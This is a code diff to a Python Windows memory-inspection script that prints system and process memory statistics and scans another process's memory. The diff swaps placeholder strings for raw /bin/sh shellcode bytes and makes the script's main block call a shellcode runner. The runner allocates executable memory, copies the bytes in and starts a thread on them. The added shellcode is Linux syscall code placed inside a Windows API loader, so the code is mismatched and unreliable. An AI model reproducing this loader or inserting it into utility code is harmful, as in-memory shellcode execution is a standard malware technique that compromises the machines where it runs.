@@ -47,8 +47,8 @@ class MEMORY_BASIC_INFORMATION(ctypes.Structure):
                 ('Protect', DWORD),
                 ('Type',    DWORD))
 
-class PERFORMANCE_INFORMATION(Structure):
-    # https://learn.microsoft.com/en-us/windows/win32/apinfo/psapinfo/ns-psapinfo-performance_information
+class PERFORMANCE_INFORMATION(ctypes.Structure):
+    # https://learn.microsoft.com/en-us/windows/win32/api/psapi/ns-psapi-performance_information
     _fields_ = (('size',               DWORD),
                 ('CommitTotal',       SIZE_T),
                 ('CommitLimit',       SIZE_T),
@@ -89,7 +89,7 @@ class MEMORYSTATUSEX(ctypes.Structure):
 
 
 # 1. get System information
-def system_info():
+def systemInfo():
     # https://msdn.microsoft.com/en-us/library/aa383751#DWORD_PTR
     LPSYSTEM_INFO = ctypes.POINTER(SYSTEM_INFO)
     Kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
@@ -105,19 +105,19 @@ def system_info():
 def getProcess(Kernel32,sysinfo):
     PID = None
     name = ""
-    print(psutil.cpu_times())
-    print(psutil.cpu_stats())
-    print(psutil.virtual_memory())
-    print(psutil.swap_memory())
-    print(psutil.disk_partitions())
-    print(psutil.disk_usage('/'))
+    print(psutil.cpu_times(),end='\n\n')
+    print(psutil.cpu_stats(),end='\n\n')
+    print(psutil.virtual_memory(),end='\n\n')
+    print(psutil.swap_memory(),end='\n\n')
+    print(psutil.disk_partitions(),end='\n\n')
+    print(psutil.disk_usage('/'),end='\n\n')
     #print(psutil.disk_io_counters())
     #print(psutil.pinfods())
 
     print("\n"+' PROCESS INFO '.center(102, '='))
     for proc in psutil.process_iter():
         #if str('chrome.exe') in str(proc.name) and proc.memory_info().rss > 200000000:
-        if proc.memory_info().rss > 200000000:
+        if proc.memory_info().rss > 200000000:    #2*10^8B ~ 195 MB
             ''' Resident Set Size (RSS)
                 驻留集大小 (RSS) 是主内存 (RAM) 中的进程占用的内存部分
             '''
@@ -126,14 +126,14 @@ def getProcess(Kernel32,sysinfo):
             name = name.replace('<bound method Process.name of psutil.Process(','').replace(')>','').replace(',','\t')
             print(name,'\tRSS:',proc.memory_info().rss)
             
-    PROCESS_QUERY_INFORMATION = 0x0400
-    PROCESS_VM_READ = 0x0010
+    processQueryInfo = 0x0400
+    processVmRead = 0x0010
     
     print("")
     print("Minimum Application Address:",sysinfo.lpMinimumApplicationAddress)
     print("Maximum Application Address:",sysinfo.lpMaximumApplicationAddress)
     print("PID:",PID)
-    Process = Kernel32.OpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ, False, PID)
+    Process = Kernel32.OpenProcess(processQueryInfo|processVmRead, False, PID)
     print('process:', Process)
     return Process
 
@@ -147,11 +147,11 @@ def getMBI(Kernel32,sysinfo,Process):
     Kernel32.VirtualQueryEx(Process, sysinfo.lpMinimumApplicationAddress, ctypes.byref(mbi),ctypes.sizeof(mbi))
     print('mbi.BaseAddress: ',mbi.BaseAddress)
     print('mbi.AllocationBase: ',mbi.AllocationBase)
-    print('mbi.AllocationProtect: ',mbi.AllocationProtect)
+    print('mbi.AllocationProtect: ',mbi.AllocationProtect)  # 0 -> the caller does not have access
     print('mbi.RegionSize: ',mbi.RegionSize)
-    print('mbi.State: ',mbi.State)
-    print('mbi.Protect: ', mbi.Protect)
-    print('mbi.Type: ',mbi.Type)
+    print('mbi.State: ',hex(mbi.State))       # 0x10000 -> MEM_FREE
+    print('mbi.Protect: ', hex(mbi.Protect))  # 0x1 -> PAGE_NOACCESS
+    print('mbi.Type: ',hex(mbi.Type))
     print("")
  
 
@@ -182,7 +182,7 @@ def scanMBI(Kernel32,sysinfo,Process,target_value = 8, print_hitpool = False):
         print(hex(start_address),' | ',hex(end_address),' | ',hex(current_address),end=end_str)
         Kernel32.VirtualQueryEx(Process, ctypes.c_void_p(current_address), ctypes.byref(mbi),ctypes.sizeof(mbi))
     
-        if mbi.Protect == PAGE_READWRITE and mbi.State == MEM_COMMIT :
+        if mbi.Protect == PAGE_READWRITE and mbi.State == MEM_COMMIT :   # mbi.Protect == 2 and mbi.State == 0x1000
             print('此区域可被扫描',end = "")
             index = current_address
             end = current_address + mbi.RegionSize
@@ -227,30 +227,28 @@ def getVirtualAlloc(kernel32):
     print("")
     if shellcode is None and platform.architecture()[0] == '64bit':
         print('Architecture is 64-bit.\n')
-        shellcode = 'x64'
+        shellcode = b"\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
     else:
         print('Architecture is 32-bit.\n')
-        shellcode = 'x86'
-    VirtualAlloc = ctypes.windll.kernel32.VirtualAlloc
-    VirtualAlloc.argtypes = [
-        wt.LPVOID, ctypes.c_size_t, wt.DWORD, wt.DWORD
-    ]
+        shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x2f"
+    VirtualAlloc = kernel32.VirtualAlloc
+    VirtualAlloc.argtypes = [wt.LPVOID, ctypes.c_size_t, wt.DWORD, wt.DWORD]
     VirtualAlloc.restype = wt.LPVOID
 
     # RtlMoveMemory()
-    RtlMoveMemory = ctypes.windll.kernel32.RtlMoveMemory
+    RtlMoveMemory = kernel32.RtlMoveMemory
     RtlMoveMemory.argtypes = [wt.LPVOID, wt.LPVOID, ctypes.c_size_t]
     RtlMoveMemory.restype = wt.LPVOID
 
     # VirtualProtect()
-    VirtualProtect = ctypes.windll.kernel32.VirtualProtect
+    VirtualProtect = kernel32.VirtualProtect
     VirtualProtect.argtypes = [
         wt.LPVOID, ctypes.c_size_t, wt.DWORD, wt.LPVOID
     ]
     VirtualProtect.restype = wt.BOOL
 
     # CreateThread()
-    CreateThread = ctypes.windll.kernel32.CreateThread
+    CreateThread = kernel32.CreateThread
     CreateThread.argtypes = [
         wt.LPVOID, ctypes.c_size_t, wt.LPVOID,
         wt.LPVOID, wt.DWORD, wt.LPVOID
@@ -268,15 +266,15 @@ def getVirtualAlloc(kernel32):
     memptr = VirtualAlloc(0, len(shellcode), MEM_COMMIT, PAGE_READWRITE_EXECUTE)
     print('VirtuallAlloc() Memory at: {:08X}'.format(memptr))
     RtlMoveMemory(memptr, shellcode , len(shellcode))
-    print('Shellcode copinfoed into memory.')
+    print('Shellcode copied into memory.')
     VirtualProtect(memptr, len(shellcode), PAGE_READ_EXECUTE, 0)
     print('Changed permissions on memory to READ_EXECUTE only.')
     thread = CreateThread(0, 0, memptr, 0, 0, 0)
     print('CreateThread() in same process.')
-    WaitForSingleObject(thread, 0xFFFFFFFF)
+    WaitForSingleObject(thread, 0xFFFFFFFF)   # 时间为负数则表示无穷等待，程序不会结束
 
 # 5. Memory Status
-def getPerformanceInfo():
+def performanceInfo():
     # http://msdn.microsoft.com/en-us/library/ms683210
     pinfo = PERFORMANCE_INFORMATION()
     windll.psapi.GetPerformanceInfo(ctypes.byref(pinfo), ctypes.sizeof(pinfo))
@@ -284,38 +282,38 @@ def getPerformanceInfo():
 
     # Get Memory Status
     # keep the unit consistent with Linux guests
-    memStats = {}
-    memStats['Total physical memory'] = str(int((pinfo.PhysicalTotal * pinfo.PageSize) / 1024))
-    memStats['Free physical memory'] = str(int((pinfo.PhysicalAvailable * pinfo.PageSize) / 1024))
-    memStats['Unused physical memory'] = memStats['Free physical memory']
-    memStats['Cached memory'] = str(int((pinfo.SystemCache * pinfo.PageSize) / 1024))
-    #memStats['Buffer memory'] = 0  # TODO: Can this be reported?
+    memStat = {}
+    memStat['Total physical memory'] = str(int((pinfo.PhysicalTotal * pinfo.PageSize) / 1024))
+    memStat['Free physical memory'] = str(int((pinfo.PhysicalAvailable * pinfo.PageSize) / 1024))
+    memStat['Unused physical memory'] = memStat['Free physical memory']
+    memStat['Cached memory'] = str(int((pinfo.SystemCache * pinfo.PageSize) / 1024))
+    #memStat['Buffer memory'] = 0  
 
     try:
-        strComputer = "."
+        strComputer = "localhost"
         objWMIService = win32com.client.Dispatch("WbemScripting.SWbemLocator")
         objSWbemServices = objWMIService.ConnectServer(strComputer, "root\\cimv2")
         colItems = objSWbemServices.ExecQuery("SELECT * FROM Win32_OperatingSystem")
         for objItem in colItems:
             # https://learn.microsoft.com/en-us/windows/win32/cimwin32prov/win32-operatingsystem
-            memStats['Total virtual memory'] = objItem.TotalVirtualMemorySize
-            memStats['Free virtual memory'] = objItem.FreeVirtualMemory
-            memStats['Max process memory'] = objItem.MaxProcessMemorySize
-            memStats['Paging free space'] = objItem.FreeSpaceInPagingFiles
-            memStats['Paging stored size'] = objItem.SizeStoredInPagingFiles
+            memStat['Total virtual memory'] = objItem.TotalVirtualMemorySize
+            memStat['Free virtual memory'] = objItem.FreeVirtualMemory
+            memStat['Max process memory'] = objItem.MaxProcessMemorySize
+            memStat['Paging free space'] = objItem.FreeSpaceInPagingFiles
+            memStat['Paging stored size'] = objItem.SizeStoredInPagingFiles
             
     except:
         logging.exception("Error retrieving detailed memory stats")
         print("Error retrieving detailed memory stats")
     try:
-        strComputer = "."
+        strComputer = "localhost"
         objWMIService = win32com.client.Dispatch("WbemScripting.SWbemLocator")
         objSWbemServices = objWMIService.ConnectServer(strComputer, "root\\cimv2")
         colItems = objSWbemServices.ExecQuery("SELECT * FROM Win32_PageFileUsage")
         for objItem in colItems:
             # Keep the unit consistent with Linux guests (KiB)
-            memStats['Total swap space usage'] = objItem.CurrentUsage * 1024
-            memStats['Total swap space size'] = objItem.AllocatedBaseSize * 1024
+            memStat['Total swap space usage'] = objItem.CurrentUsage * 1024
+            memStat['Total swap space size'] = objItem.AllocatedBaseSize * 1024
     except Exception:
         logging.exception("Failed to retrieve page file stats")
         print("Failed to retrieve page file stats")
@@ -325,12 +323,12 @@ def getPerformanceInfo():
     print("  Get Mem Status using GetPerformanceInfo() ")
     print("".center(46,'='))
     print('Available RAM\t\t{:.0f}'.format((pinfo.PhysicalAvailable * pinfo.PageSize) / (1024 ** 2)))
-    for item in memStats:
+    for item in memStat:
         if len(item) <=15 :
             separate = '\t\t'
         else:
             separate = '\t'
-        print(item+separate+str(memStats[item]))
+        print(item+separate+str(memStat[item]))
     print("")
 
 
@@ -351,11 +349,10 @@ def globalStat():
     
 
 if __name__ == "__main__":
-    Kernel32,sysinfo = system_info()
+    Kernel32,sysinfo = systemInfo()
     Process = getProcess(Kernel32,sysinfo)
     getMBI(Kernel32,sysinfo,Process)
-    scanMBI(Kernel32,sysinfo,Process,print_hitpool=True)
-    #getVirtualAlloc(Kernel32)
-    getPerformanceInfo()
+    #scanMBI(Kernel32,sysinfo,Process,print_hitpool=True)
+    performanceInfo()
     globalStat()
-    
+    getVirtualAlloc(Kernel32)
